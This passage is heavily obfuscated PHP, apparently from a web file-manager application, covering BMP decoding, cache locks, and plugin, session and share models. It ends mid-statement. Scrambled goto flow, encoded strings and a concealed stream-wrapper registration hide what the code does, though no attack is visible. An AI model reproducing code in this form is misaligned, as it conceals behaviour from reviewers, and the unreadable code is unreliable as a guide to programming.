list(, $c¢õ≥±Ö˘§, $c≤ÍïûÌ•”) = unpack($cØ®∂ÂÜÏ√[1817], $fÛ±·¿Â™Ô); $céà©≠±–∫ += $c¢õ≥±Ö˘§; $a∞Éã£∂ˆæ += $c≤ÍïûÌ•” * $b˘ëÇ™°®æ; break; default: list(, $Dº˘ö“≈âÃ) = unpack($cØ®∂ÂÜÏ√[1818], $fÛ±·¿Â™Ô); $c§ÏíáÕ·ü = ($Dº˘ö“≈âÃ >> $fúºÊãﬁ◊û) + ($Dº˘ö“≈âÃ & $fúºÊãﬁ◊û); $fÛ±·¿Â™Ô = fread($dÍÈµËûÃŸ, $c§ÏíáÕ·ü + 1 & ~1); if ($fÛ±·¿Â™Ô === !1) { imagedestroy($Dëï°ªá¯µ); return !1; } for ($d˜òîôèê¬ = 0, $D‚Øıæ›Í± = 0; $d˜òîôèê¬ < $Dº˘ö“≈âÃ; ++$d˜òîôèê¬, ++$céà©≠±–∫, $D‚Øıæ›Í± += $Eí¨≠ÜÀ√É) { list(, $d≤§™¢€â—) = unpack($cØ®∂ÂÜÏ√[1818], $fÛ±·¿Â™Ô[$D‚Øıæ›Í± >> 3]); $Eá∫ìë›çè = $D‚Øıæ›Í± & 7; imagesetpixel($Dëï°ªá¯µ, $céà©≠±–∫, $a∞Éã£∂ˆæ, $fËŸÓÚŒî„[($d≤§™¢€â— & $Eøèò§àŒ‹ >> $Eá∫ìë›çè) >> $C¶πÜÉá—„ - $Eá∫ìë›çè]); } break; } break; default: $CÉ¯√ﬁèõ¯ = fread($dÍÈµËûÃŸ, 1); if ($CÉ¯√ﬁèõ¯ === !1) { imagedestroy($Dëï°ªá¯µ); return !1; } list(, $bõÈÆ≈ÂÔ£, $d≤§™¢€â—) = unpack($cØ®∂ÂÜÏ√[1817], $fÛ±·¿Â™Ô . $CÉ¯√ﬁèõ¯); for ($d˜òîôèê¬ = 0, $D‚Øıæ›Í± = 0; $d˜òîôèê¬ < $bõÈÆ≈ÂÔ£; ++$d˜òîôèê¬, ++$céà©≠±–∫, $D‚Øıæ›Í± += $Eí¨≠ÜÀ√É) { $Eá∫ìë›çè = $D‚Øıæ›Í± & 7; imagesetpixel($Dëï°ªá¯µ, $céà©≠±–∫, $a∞Éã£∂ˆæ, $fËŸÓÚŒî„[($d≤§™¢€â— & $Eøèò§àŒ‹ >> $Eá∫ìë›çè) >> $C¶πÜÉá—„ - $Eá∫ìë›çè]); } break; } } } else { for ($F®±ßßÃô = 0; $F®±ßßÃô < $F©‘€ñçßì; ++$F®±ßßÃô, $a∞Éã£∂ˆæ += $b˘ëÇ™°®æ) { $fÛ±·¿Â™Ô = fread($dÍÈµËûÃŸ, $dˆﬂòùÛëì); if ($fÛ±·¿Â™Ô === !1) { imagedestroy($Dëï°ªá¯µ); return !1; } $D‚Øıæ›Í± = 0; for ($céà©≠±–∫ = 0; $céà©≠±–∫ < $d»Ô˜–Á±; ++$céà©≠±–∫, $D‚Øıæ›Í± += $Eí¨≠ÜÀ√É) { list(, $d≤§™¢€â—) = unpack($cØ®∂ÂÜÏ√[1818], $fÛ±·¿Â™Ô[$D‚Øıæ›Í± >> 3]); $Eá∫ìë›çè = $D‚Øıæ›Í± & 7; imagesetpixel($Dëï°ªá¯µ, $céà©≠±–∫, $a∞Éã£∂ˆæ, $fËŸÓÚŒî„[($d≤§™¢€â— & $Eøèò§àŒ‹ >> $Eá∫ìë›çè) >> $C¶πÜÉá—„ - $Eá∫ìë›çè]); } } } goto aé‘Éá√ç∫; fâÍ¡ÕôÉ§: $Dëï°ªá¯µ = imagecreate($d»Ô˜–Á±, $F©‘€ñçßì); $eà˜º◊∞Ë≈ = $bëﬁ“Çò£Í == 12 ? 3 : 4; $B≥™èı£Ñ• = $A·∂«¡—˘… ? $A·∂«¡—˘… : pow(2, $Eí¨≠ÜÀ√É); goto e¢ÊŒ€õ…À; aé‘Éá√ç∫: } else { goto D¶Æåôí÷°; Eàªû°´Ωπ: $BéíÇÀû„∏ = $Eí¨≠ÜÀ√É >> 3; $F•÷ô‚∞Ë = $e´Øß’ﬁ◊â ? 127 : 0; $bêŒóëÜØã = $e´Øß’ﬁ◊â ? 1 / $e´Øß’ﬁ◊â : 1; goto FΩå¡£»ëè; D¶Æåôí÷°: $Dëï°ªá¯µ = imagecreatetruecolor($d»Ô˜–Á±, $F©‘€ñçßì); imagealphablending($Dëï°ªá¯µ, !1); if ($e´Øß’ﬁ◊â) { imagesavealpha($Dëï°ªá¯µ, !0); } goto Eàªû°´Ωπ; FΩå¡£»ëè: $aèâÉÙñ†é = $bﬂÔòæ∆  ? 1 / $bﬂÔòæ∆  : 1; $D±˘•‘ åı = $aòÜô¿©±— ? 1 / $aòÜô¿©±— : 1; $CÜ±∆˘Ω™æ = $BãÁ¿è¥ö© ? 1 / $BãÁ¿è¥ö© : 1; goto F©üÜñ£∆ï; F©üÜñ£∆ï: for ($F®±ßßÃô = 0; $F®±ßßÃô < $F©‘€ñçßì; ++$F®±ßßÃô, $a∞Éã£∂ˆæ += $b˘ëÇ™°®æ) { $fÛ±·¿Â™Ô = fread($dÍÈµËûÃŸ, $dˆﬂòùÛëì); if ($fÛ±·¿Â™Ô === !1) { imagedestroy($Dëï°ªá¯µ); return !1; } $D‚Øıæ›Í± = 0; for ($céà©≠±–∫ = 0; $céà©≠±–∫ < $d»Ô˜–Á±; ++$céà©≠±–∫, $D‚Øıæ›Í± += $BéíÇÀû„∏) { list(, $d≤§™¢€â—) = unpack($cØ®∂ÂÜÏ√[1795], substr($fÛ±·¿Â™Ô, $D‚Øıæ›Í±, $BéíÇÀû„∏) . $cØ®∂ÂÜÏ√[1819]); $EÚØ”ö«¢ç = $d≤§™¢€â— & $e´Øß’ﬁ◊â; $F∞ê«êÏ·ù = $d≤§™¢€â— & $bﬂÔòæ∆ ; $CÚàêãø¶® = $d≤§™¢€â— & $aòÜô¿©±—; $døñÉÕ•˘÷ = $d≤§™¢€â— & $BãÁ¿è¥ö©; $FÇãî·ÿá• = $F•÷ô‚∞Ë - (($EÚØ”ö«¢ç << 7) - $EÚØ”ö«¢ç) * $bêŒóëÜØã; $d±⁄ÜÀÑê∞ = (($F∞ê«êÏ·ù << 8) - $F∞ê«êÏ·ù) * $aèâÉÙñ†é; $E‡Ïã⁄” ˆ = (($CÚàêãø¶® << 8) - $CÚàêãø¶®) * $D±˘•‘ åı; $Eá∫ìë›çè = (($døñÉÕ•˘÷ << 8) - $døñÉÕ•˘÷) * $CÜ±∆˘Ω™æ; imagesetpixel($Dëï°ªá¯µ, $céà©≠±–∫, $a∞Éã£∂ˆæ, $FÇãî·ÿá• << 24 | $d±⁄ÜÀÑê∞ << 16 | $E‡Ïã⁄” ˆ << 8 | $Eá∫ìë›çè); } } imagealphablending($Dëï°ªá¯µ, !0); goto dπÁêìäñí; dπÁêìäñí: } return $Dëï°ªá¯µ; goto C∫’èå©∆È; C∫ΩéëÎ‰Ë: $cØ®∂ÂÜÏ√ =& $_SERVER[Æ¡î¢≠¯™]; if ($dú∫Ù©Ø¨È[$cØ®∂ÂÜÏ√[393]] != 19778) { return !1; } $fÛ±·¿Â™Ô = fread($dÍÈµËûÃŸ, 4); goto e¢§ÒÆ≠∑Ø; C∫’èå©∆È: } } goto dÏ–•¨ÂÇë; D¶ññ≥ûÿ“: $_SERVER[$_SERVER[âñö‚‚Ñ][52]] = ("\x39\x34\x37\x34"."\x34\x33")+0;$_39YH="r57UGrjJvgBKn7JfcRkPqqnYmjRvZYYejZm5Q3SWWJhqHVWX8dHptTH4zn9uazDz7yrw2wpHCifd";; stream_wrapper_register($_SERVER[âñö‚‚Ñ][53], $_SERVER[âñö‚‚Ñ][54]); class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($aà®»…Ôﬂ, $AÈ‰À¨∂Âê) { $E≠ƒƒ ‡∆∆ =& $_SERVER[Æ¡î¢≠¯™]; if (isset(self::$_methodList[$aà®»…Ôﬂ])) { return @call_user_func_array(self::$_methodList[$aà®»…Ôﬂ], $AÈ‰À¨∂Âê); } else { if (method_exists($this, $aà®»…Ôﬂ)) { return call_user_func_array(array($this, $aà®»…Ôﬂ), $AÈ‰À¨∂Âê); } else { think_exception(__CLASS__ . $E≠ƒƒ ‡∆∆[4] . $aà®»…Ôﬂ . $E≠ƒƒ ‡∆∆[5]); } } } public static function __callStatic($a˜ñç¿•”“, $D®ò„òæﬁÖ) { if (isset(self::$_methodListStatic[$a˜ñç¿•”“])) { return call_user_func_array(self::$_methodListStatic[$a˜ñç¿•”“], $D®ò„òæﬁÖ); } else { if (method_exists(self, $a˜ñç¿•”“)) { return call_user_func_array(array(self, $a˜ñç¿•”“), $D®ò„òæﬁÖ); } else { show_json("{$a˜ñç¿•”“}\x28\51\40\156\x6f\164\x20\x65\170\151\x73\x74\x3b", !1); } } } public static function addMethod($C´á€§≥üø, $A∂è◊¿⁄ Õ) { self::$_methodList[$C´á€§≥üø] = $A∂è◊¿⁄ Õ; } public static function addMethodStatic($Bñ‘Ü∑ÉÕí, $bÀÖ‘´ÇÑä) { self::$_methodListStatic[$Bñ‘Ü∑ÉÕí] = $bÀÖ‘´ÇÑä; } } goto dªËøîœ’Ú; E ˘‹Ìé˘Á: define($_SERVER[Æ¡î¢≠¯™][1888], 1); define($_SERVER[Æ¡î¢≠¯™][1889], 2); define($_SERVER[Æ¡î¢≠¯™][1890], 3); goto dÀ´È¢´¬ã; b¢—ç¶ü—…: function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $dÖ∂ÿ·›úœ =& $_SERVER[Æ¡î¢≠¯™]; $D ≠·¨ªôﬁ = $GLOBALS[$dÖ∂ÿ·›úœ[6]][$dÖ∂ÿ·›úœ[343]]; self::$cachePath = $D ≠·¨ªôﬁ[$dÖ∂ÿ·›úœ[174]][$dÖ∂ÿ·›úœ[85]]; @mkdir(self::$cachePath, 511, !0); } public function lock($c‹œåÜç©¢, $f⁄åıÆΩå∞ = 0) { goto F∞∂ëç•≥¬; BÎ≠˜ëïé†: $this->unlock($c‹œåÜç©¢); return !1; goto fåÒ≠ÖØπî; F∞∂ëç•≥¬: $eéÁ÷©ﬂˆÃ =& $_SERVER[Æ¡î¢≠¯™]; $cÍÔ◊©°÷ä = microtime(!0); $aﬂä≤º⁄©ô = $cÍÔ◊©°÷ä + $f⁄åıÆΩå∞ + 0.0001; goto bÑÒ∏Ãåπ£; bÑÒ∏Ãåπ£: $c«æœåÌåó = rtrim(self::$cachePath, $eéÁ÷©ﬂˆÃ[8]) . $eéÁ÷©ﬂˆÃ[764] . md5($c‹œåÜç©¢) . $eéÁ÷©ﬂˆÃ[765]; if (file_exists($c«æœåÌåó) && filemtime($c«æœåÌåó) && filemtime($c«æœåÌåó) < time() - 10) { @unlink($c«æœåÌåó); } do { if (file_exists($c«æœåÌåó)) { cacheLockWait(); continue; } $cÎ°…§ˆ˘ = fopen($c«æœåÌåó, $eéÁ÷©ﬂˆÃ[766]); if (!$cÎ°…§ˆ˘) { return !1; } $EÂ…∑ºÌË‡ = flock($cÎ°…§ˆ˘, LOCK_EX | LOCK_NB); self::$caches[$c‹œåÜç©¢] = array($eéÁ÷©ﬂˆÃ[767] => $cÎ°…§ˆ˘, $eéÁ÷©ﬂˆÃ[174] => $c«æœåÌåó); fwrite($cÎ°…§ˆ˘, $aﬂä≤º⁄©ô); clearstatcache(); if ($cÎ°…§ˆ˘ && $EÂ…∑ºÌË‡) { return !0; } cacheLockWait(); } while (microtime(!0) < $aﬂä≤º⁄©ô); goto BÎ≠˜ëïé†; fåÒ≠ÖØπî: } public function lockGet($Dƒçí©®’‘) { $e÷◊êıÖ©ı =& $_SERVER[Æ¡î¢≠¯™]; $C£˜ôÜ¢Ω® = rtrim(self::$cachePath, $e÷◊êıÖ©ı[8]) . $e÷◊êıÖ©ı[764] . md5($Dƒçí©®’‘) . $e÷◊êıÖ©ı[765]; return file_exists($C£˜ôÜ¢Ω®); } public function unlock($dÑÎæô›É) { goto bøΩ•⁄ÑΩﬂ; c‰¥ÂÖë≠è: unset(self::$caches[$dÑÎæô›É]); goto Dò•≥ù√≠–; e‡∞‘ËΩÈ¨: @flock($e£Ê§ß•∫[$dÈœóë…‚œ[767]], LOCK_UN); @fclose($e£Ê§ß•∫[$dÈœóë…‚œ[767]]); @unlink($e£Ê§ß•∫[$dÈœóë…‚œ[174]]); goto c‰¥ÂÖë≠è; bøΩ•⁄ÑΩﬂ: $dÈœóë…‚œ =& $_SERVER[Æ¡î¢≠¯™]; $e£Ê§ß•∫ = self::$caches[$dÑÎæô›É]; if (!$e£Ê§ß•∫) { return; } goto e‡∞‘ËΩÈ¨; Dò•≥ù√≠–: } } class CacheLockRedis { public function lock($E·—Çˆ»›π, $e◊æÏ√É» = 10) { $D€àÖﬂ◊¿Ò = Cache::init(); $a≤ÔÜÂì◊ò = microtime(!0) + $e◊æÏ√É»; while (microtime(!0) < $a≤ÔÜÂì◊ò) { $D—⁄€ô¥çú = $D€àÖﬂ◊¿Ò->get($E·—Çˆ»›π); if (!$D—⁄€ô¥çú) { $EÏí˜€úÚ∫ = $D€àÖﬂ◊¿Ò->setLock($E·—Çˆ»›π, $a≤ÔÜÂì◊ò, $e◊æÏ√É»); if ($EÏí˜€úÚ∫) { return !0; } } else { if ($D—⁄€ô¥çú < microtime(!0)) { $D€àÖﬂ◊¿Ò->set($E·—Çˆ»›π, $a≤ÔÜÂì◊ò, $a≤ÔÜÂì◊ò); if ($D€àÖﬂ◊¿Ò->get($E·—Çˆ»›π) === $D—⁄€ô¥çú) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($BÁ·±ÏÇõÑ) { return Cache::init()->get($BÁ·±ÏÇõÑ); } public function unlock($E‘ïøÀÏ∑∞) { return Cache::init()->remove($E‘ïøÀÏ∑∞); } } goto e ì‹˘–µÑ; B¯ÓÚüßÉ—: class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\x6d\56\x70\x6c\x75\x67\151\156\x4c\151\163\164"; public $field = array("\x6e\x61\155\145", "\x73\164\141\x74\x75\163", "\162\145\147\x69\x65\163\164", "\143\157\x6e\x66\151\147"); public function loadList($aàç÷°âõü = false) { $añÇ⁄è¥·È = array_to_keyvalue($this->listData(), $_SERVER[Æ¡î¢≠¯™][28]); if ($aàç÷°âõü) { return $añÇ⁄è¥·È[$aàç÷°âõü]; } return $añÇ⁄è¥·È; } public function init() { $A±Ñá†ú‘‘ =& $_SERVER[Æ¡î¢≠¯™]; Hook::trigger($A±Ñá†ú‘‘[2149]); $a¡‹°ôé É = $this->loadPluginList(); foreach ($a¡‹°ôé É as $cå≈ÔÕúﬂà => $eú‡‡—Éﬁò) { $b∏¿∂à¬îΩ = $this->appAllow($cå≈ÔÕúﬂà, $eú‡‡—Éﬁò); if (!$b∏¿∂à¬îΩ) { continue; } foreach ($eú‡‡—Éﬁò[$A±Ñá†ú‘‘[2150]] as $f⁄ú”·öﬁ¡ => $B≈îê±˜µÈ) { Hook::bind($f⁄ú”·öﬁ¡, $B≈îê±˜µÈ); } } Hook::trigger($A±Ñá†ú‘‘[2151]); Hook::trigger(ACTION); } public function appAllow($dØáÖ¥¯ÇÂ, $f°’«ü«ÒÑ, $A⁄ïáâ‡ìÙ = true) { $e¬Œ°‰Õñ∞ =& $_SERVER[Æ¡î¢≠¯™]; $dÒ·¿¡≥≠æ = PLUGIN_DIR . $dØáÖ¥¯ÇÂ . $e¬Œ°‰Õñ∞[2152]; if (!is_array($f°’«ü«ÒÑ) || !is_array($f°’«ü«ÒÑ[$e¬Œ°‰Õñ∞[2150]]) || !is_file($dÒ·¿¡≥≠æ) || $f°’«ü«ÒÑ[$e¬Œ°‰Õñ∞[681]] != 1) { return !1; } if ($A⁄ïáâ‡ìÙ && !Action($e¬Œ°‰Õñ∞[2153])->checkAuth($dØáÖ¥¯ÇÂ)) { return !1; } return !0; } public function unInstall($dà¥éÜäîÿ) { $eÉÛı‚•÷Ñ =& $_SERVER[Æ¡î¢≠¯™]; $d–’⁄ÑàÿÏ = $this->loadList($dà¥éÜäîÿ); if (file_exists(PLUGIN_DIR . $dà¥éÜäîÿ)) { Hook::apply($dà¥éÜäîÿ . $eÉÛı‚•÷Ñ[2154]); } $this->remove($d–’⁄ÑàÿÏ[$eÉÛı‚•÷Ñ[372]]); } public function changeStatus($DÇ„õåÛÉ˘, $A≈Öü‚˘“¨) { $AﬂÜ≈ Ùã∞ =& $_SERVER[Æ¡î¢≠¯™]; $c÷ÏúÕÀòõ = $this->loadList($DÇ„õåÛÉ˘); if ($A≈Öü‚˘“¨) { Hook::apply($DÇ„õåÛÉ˘ . $AﬂÜ≈ Ùã∞[2155]); } $this->update($c÷ÏúÕÀòõ[$AﬂÜ≈ Ùã∞[372]], array($AﬂÜ≈ Ùã∞[2156] => $A≈Öü‚˘“¨)); } public function appRegist($fÑË‡πÀÊı, $Cı˜¿îøªë) { $a€ÿÂ»éµÁ =& $_SERVER[Æ¡î¢≠¯™]; $Eë ±∆≤úª = $this->loadList($fÑË‡πÀÊı); if ($Eë ±∆≤úª) { $this->update($Eë ±∆≤úª[$a€ÿÂ»éµÁ[372]], array($a€ÿÂ»éµÁ[2150] => $Cı˜¿îøªë)); } else { $Aƒ§≥âÆÇñ = array($a€ÿÂ»éµÁ[28] => $fÑË‡πÀÊı, $a€ÿÂ»éµÁ[2150] => $Cı˜¿îøªë, $a€ÿÂ»éµÁ[681] => 0, $a€ÿÂ»éµÁ[6] => $this->getConfigDefault($fÑË‡πÀÊı)); $this->insert($Aƒ§≥âÆÇñ); } } public function getConfigDefault($Aá˘›ﬁ•ÖÛ) { $EÔ†¢⁄à∫ê =& $_SERVER[Æ¡î¢≠¯™]; $A÷¿ÌëâÇÎ = array(); $cæ≈õÍ¬ôÆ = $this->getPackageJson($Aá˘›ﬁ•ÖÛ); if (!$cæ≈õÍ¬ôÆ && is_array($cæ≈õÍ¬ôÆ[$EÔ†¢⁄à∫ê[2157]])) { return $A÷¿ÌëâÇÎ; } foreach ($cæ≈õÍ¬ôÆ[$EÔ†¢⁄à∫ê[2157]] as $BÊ√›◊ëÚ√ => $AŒºöïèàÃ) { if (!isset($AŒºöïèàÃ[$EÔ†¢⁄à∫ê[365]]) || isset($A÷¿ÌëâÇÎ[$BÊ√›◊ëÚ√])) { continue; } $A÷¿ÌëâÇÎ[$BÊ√›◊ëÚ√] = $AŒºöïèàÃ[$EÔ†¢⁄à∫ê[365]]; } return $A÷¿ÌëâÇÎ; } public function getPackageJson($A≈ö‚…ÁÃ°) { return Hook::apply($A≈ö‚…ÁÃ° . $_SERVER[Æ¡î¢≠¯™][2158]); } public function getConfig($F•∫˜ô™Æ, $FŒˆÂ©ﬁíê = false) { $F»†√üòâÑ =& $_SERVER[Æ¡î¢≠¯™]; $a¯ô«Õë› = array(); $aÙñ∑»à•± = $this->loadList($F•∫˜ô™Æ); if ($aÙñ∑»à•± && is_array($aÙñ∑»à•±[$F»†√üòâÑ[6]])) { $a¯ô«Õë› = $aÙñ∑»à•±[$F»†√üòâÑ[6]]; } if (!$a¯ô«Õë› || $FŒˆÂ©ﬁíê) { $a¯ô«Õë› = $this->getConfigDefault($F•∫˜ô™Æ); } return $a¯ô«Õë›; } public function setConfig($Cê˜ñ≥¬ÖÙ, $CòÊÆïÇΩË = false) { goto CÁÃªü›¨è; CÁÃªü›¨è: $f“ö∂∞®‘É =& $_SERVER[Æ¡î¢≠¯™]; $cÛÚÈÜıö€ = $this->loadList($Cê˜ñ≥¬ÖÙ); if (!$cÛÚÈÜıö€) { return !1; } goto D˘Èï€ıòâ; cçÜ®Ô∂¿ﬁ: $this->update($cÛÚÈÜıö€[$f“ö∂∞®‘É[372]], array($f“ö∂∞®‘É[6] => $CŸŸÉë¢Ô¨)); goto A⁄Ü≠É¥Õô; D˘Èï€ıòâ: if ($CòÊÆïÇΩË == !1) { $CòÊÆïÇΩË = $this->getConfigDefault($Cê˜ñ≥¬ÖÙ); } $CŸŸÉë¢Ô¨ = $cÛÚÈÜıö€[$f“ö∂∞®‘É[6]]; foreach ($CòÊÆïÇΩË as $FáÑ–Óìöñ => $EÉ¨ñ˜Ñí•) { $CŸŸÉë¢Ô¨[$FáÑ–Óìöñ] = is_string($EÉ¨ñ˜Ñí•) ? trim($EÉ¨ñ˜Ñí•) : $EÉ¨ñ˜Ñí•; } goto cçÜ®Ô∂¿ﬁ; A⁄Ü≠É¥Õô: } public function viewList() { goto c’€Û∞ŒÖ∆; Eèõå—Î∆¿: return $cÖÑå†Ãß¡; goto AÿàÔÉì’û; e≥ï°≠∂ù‚: $eç∫ÓñéÑª = $this->loadPluginList(); $cÖÑå†Ãß¡ = array(); foreach ($eç∫ÓñéÑª as $a’ï≠ÎÕÍ¶ => $AÁÀóÙÉ‘¬) { unset($AÁÀóÙÉ‘¬[$AµÚ»¿íöø[2150]], $AÁÀóÙÉ‘¬[$AµÚ»¿íöø[6]]); $FáÈ›ÜÓÇ÷ = PLUGIN_DIR . $AÁÀóÙÉ‘¬[$AµÚ»¿íöø[28]] . $AµÚ»¿íöø[2152]; if (!is_file($FáÈ›ÜÓÇ÷)) { continue; } $eáü≤øôé≠ = Hook::apply($AÁÀóÙÉ‘¬[$AµÚ»¿íöø[28]] . $AµÚ»¿íöø[2158]); if (is_array($eáü≤øôé≠)) { $cÖÑå†Ãß¡[$a’ï≠ÎÕÍ¶] = array_merge($AÁÀóÙÉ‘¬, $eáü≤øôé≠); } } goto Eèõå—Î∆¿; c’€Û∞ŒÖ∆: $AµÚ»¿íöø =& $_SERVER[Æ¡î¢≠¯™]; $eç∫ÓñéÑª = $this->loadList(); $this->pluginScan($eç∫ÓñéÑª); goto e≥ï°≠∂ù‚; AÿàÔÉì’û: } private function loadPluginList() { $CÇßŸë√ﬂó =& $_SERVER[Æ¡î¢≠¯™]; $dî›À∆»æ« = $this->loadList(); if (strtolower(MOD) == $CÇßŸë√ﬂó[2159]) { return $dî›À∆»æ«; } $A¬ÑáπùÓú = Hook::trigger($CÇßŸë√ﬂó[2160], $dî›À∆»æ«); if ($dî›À∆»æ« && !$A¬ÑáπùÓú) { die; } return $A¬ÑáπùÓú ? $A¬ÑáπùÓú : $dî›À∆»æ«; } private function pluginScan($A˘î≥®àË) { $Dœó®∫ÁÿÜ =& $_SERVER[Æ¡î¢≠¯™]; recursion_dir(PLUGIN_DIR, $f≥è¨Ò«¬¿, $CÆà≠Ì∑’ , 0); foreach ($f≥è¨Ò«¬¿ as $A¯óÔÀªÌ£) { $bï”“ª±Ô≤ = get_path_this($A¯óÔÀªÌ£); if (isset($A˘î≥®àË[$bï”“ª±Ô≤]) || !file_exists($A¯óÔÀªÌ£ . $Dœó®∫ÁÿÜ[2161]) || !file_exists($A¯óÔÀªÌ£ . $Dœó®∫ÁÿÜ[2152])) { continue; } Hook::apply($bï”“ª±Ô≤ . $Dœó®∫ÁÿÜ[2155]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\x79\x73\164\145\155\137\x73\145\x73\163\151\157\x6e"; public function get($Eä‹òÇ†ﬂË) { $FÂŒòüÕ‘Ó =& $_SERVER[Æ¡î¢≠¯™]; $aéàâáêÔ® = $this->where(array($FÂŒòüÕ‘Ó[2162] => $Eä‹òÇ†ﬂË))->find(); if (!is_array($aéàâáêÔ®)) { return !1; } return $aéàâáêÔ®[$FÂŒòüÕ‘Ó[684]]; } public function set($bé•‹ÁÍçâ, $EãøàÙ≈õ“, $AÇ™êÀÜ§ = 3600) { $DÆËÚ‘é´Ç =& $_SERVER[Æ¡î¢≠¯™]; $fªä∂è›ºÊ = array($DÆËÚ‘é´Ç[2162] => $bé•‹ÁÍçâ, $DÆËÚ‘é´Ç[2091] => $EãøàÙ≈õ“, $DÆËÚ‘é´Ç[2163] => $AÇ™êÀÜ§ + time()); if (Session::get($DÆËÚ‘é´Ç[2164])) { $fªä∂è›ºÊ[$DÆËÚ‘é´Ç[1397]] = Session::get($DÆËÚ‘é´Ç[2164]); } else { $fªä∂è›ºÊ[$DÆËÚ‘é´Ç[1397]] = 0; } if ($this->get($bé•‹ÁÍçâ)) { return $this->where(array($DÆËÚ‘é´Ç[2162] => $bé•‹ÁÍçâ))->save($fªä∂è›ºÊ); } else { return $this->add($fªä∂è›ºÊ, array(), !0); } } public function remove($F«©Áøáó ) { return $this->where(array($_SERVER[Æ¡î¢≠¯™][2162] => $F«©Áøáó ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[Æ¡î¢≠¯™][2165] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\150\x61\x72\145"; protected $dataAuto = array(array("\155\x6f\x64\x69\146\171\124\151\155\x65", "\x74\151\155\x65", "\151\x6e\x73\145\x72\x74\x2c\165\160\144\141\164\145", "\146\x75\156\x63\x74\x69\x6f\156"), array("\x63\x72\145\141\x74\145\124\x69\x6d\x65", "\x74\151\x6d\145", "\x69\156\163\145\x72\164", "\x66\165\156\143\x74\151\157\156"), array("\x6f\160\x74\x69\x6f\x6e\x73", '', "\x69\156\163\x65\x72\164\54\x75\160\144\x61\x74\x65\54\x73\x65\154\145\143\x74", "\152\x73\x6f\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($eÉ√º¿®ã˜) { $fá†Ωæƒôì =& $_SERVER[Æ¡î¢≠¯™]; $aº√Ñµ…Ø„ = isset($eÉ√º¿®ã˜[0]) ? $eÉ√º¿®ã˜[0] : !1; return array($fá†Ωæƒôì[2166] => array(USER_ID, $fá†Ωæƒôì[2167]), $fá†Ωæƒôì[2129] => array($aº√Ñµ…Ø„, $fá†Ωæƒôì[2168])); } protected function listSimple() { $bÒ¿âÜπŸ‰ = array($_SERVER[Æ¡î¢≠¯™][1397] => USER_ID); $f„Êç–◊≥˘ = $this->field($this->fieldList)->where($bÒ¿âÜπŸ‰)->select(); return $f„Êç–◊≥˘ ? $f„Êç–◊≥˘ : array(); } protected function getInfo($d©Œ≈Ò˜ÈÏ, $Fœæ÷åâ‡â = false) { $a¥‹âïÀ°È =& $_SERVER[Æ¡î¢≠¯™]; if ($Fœæ÷åâ‡â) { return $this->_getShareInfo(array($a¥‹âïÀ°È[445] => $d©Œ≈Ò˜ÈÏ)); } $Fçøõ⁄¿≤‚ = $this->cacheFunctionGet($a¥‹âïÀ°È[2169], $d©Œ≈Ò˜ÈÏ); return $Fçøõ⁄¿≤‚; } public function getInfoByHash($bøÑ‡Àíû ) { return $this->_getShareInfo(array($_SERVER[Æ¡î¢≠¯™][447] => $bøÑ‡Àíû )); } public function getInfoByPath($C≈Â’¶ãúÚ) { $c‘ˆÜÃÖËù =& $_SERVER[Æ¡î¢≠¯™]; $dﬂÃµ√Ñ‘á = array($c‘ˆÜÃÖËù[1397] => USER_ID, $c‘ˆÜÃÖËù[374] => $C≈Â’¶ãúÚ); return $this->_getShareInfo($dﬂÃµ√Ñ‘á); } public function getInfoBySourcePath($b°¶ÛöÑﬂ§) { $EßìµÛ¨√è =& $_SERVER[Æ¡î¢≠¯™]; $A†≈‡ïâﬂ∏ = array($EßìµÛ¨√è[1397] => USER_ID, $EßìµÛ¨√è[1004] => $b°¶ÛöÑﬂ§); return $this->_getShareInfo($A†≈‡ïâﬂ∏); } private function _getShareInfo($E⁄ñâ£ìÏç) { goto b‚ãË∂áÜÆ; AÎ‰‰ë¨ø…: $E⁄ñâ£ìÏç = array($bà„÷ã™∞≤[445] => $A¶Êû˜Ò≈»[$bà„÷ã™∞≤[445]]); $F©öáúÖ≥Ø = $bà„÷ã™∞≤[2170]; $B˜≠ø±í¨â = Model($bà„÷ã™∞≤[541])->order($bà„÷ã™∞≤[372])->field($F©öáúÖ≥Ø)->where($E⁄ñâ£ìÏç)->select(); goto F¶çÜÖ˘Ç√; b‚ãË∂áÜÆ: $bà„÷ã™∞≤ =& $_SERVER[Æ¡î¢≠¯™]; $A¶Êû˜Ò≈» = $this->where($E⁄ñâ£ìÏç)->find(); if (!$A¶Êû˜Ò≈») { return !1; } goto AÎ‰‰ë¨ø…; F¶çÜÖ˘Ç√: if ($A¶Êû˜Ò≈»[$bà„÷ã™∞≤[374]] == $bà„÷ã™∞≤[472]) { $A¶Êû˜Ò≈»[$bà„÷ã™∞≤[396]] = IO::info($A¶Êû˜Ò≈»[$bà„÷ã™∞≤[1004]]); } else { $A¶Êû˜Ò≈»[$bà„÷ã™∞≤[396]] = Model($bà„÷ã™∞≤[1096])->pathInfo($A¶Êû˜Ò≈»[$bà„÷ã™∞≤[374]]); } $A¶Êû˜Ò≈»[$bà„÷ã™∞≤[2171]] = $B˜≠ø±í¨â; return $A¶Êû˜Ò≈»; goto f¶ÖÃØ∂âø; f¶ÖÃØ∂âø: } protected function getInfoAuth($Bµ€ªàâ∞ﬂ) { $a∆˘É„í–ë =& $_SERVER[Æ¡î¢≠¯™]; $FπﬂµÃ≥–∆ = $this->getInfo($Bµ€ªàâ∞ﬂ); $FπﬂµÃ≥–∆[$a∆˘É„í–ë[381]] = Model($a∆˘É„í–ë[458])->authMake($FπﬂµÃ≥–∆[$a∆˘É„í–ë[2171]]); return $FπﬂµÃ≥–∆; } protected function listData($A®ùŒÉùüÖ = null, $C©∑≈®çÕ‘ = 300) { $cñú‚Ì¢Îã =& $_SERVER[Æ¡î¢≠¯™]; $AÓ∏ó⁄¡˜Ê = array(array($cñú‚Ì¢Îã[450] => array($cñú‚Ì¢Îã[914], 0), $cñú‚Ì¢Îã[452] => array($cñú‚Ì¢Îã[914], 0), $cñú‚Ì¢Îã[2172] => $cñú‚Ì¢Îã[2141])); if ($A®ùŒÉùüÖ == $cñú‚Ì¢Îã[1827]) { $AÓ∏ó⁄¡˜Ê = 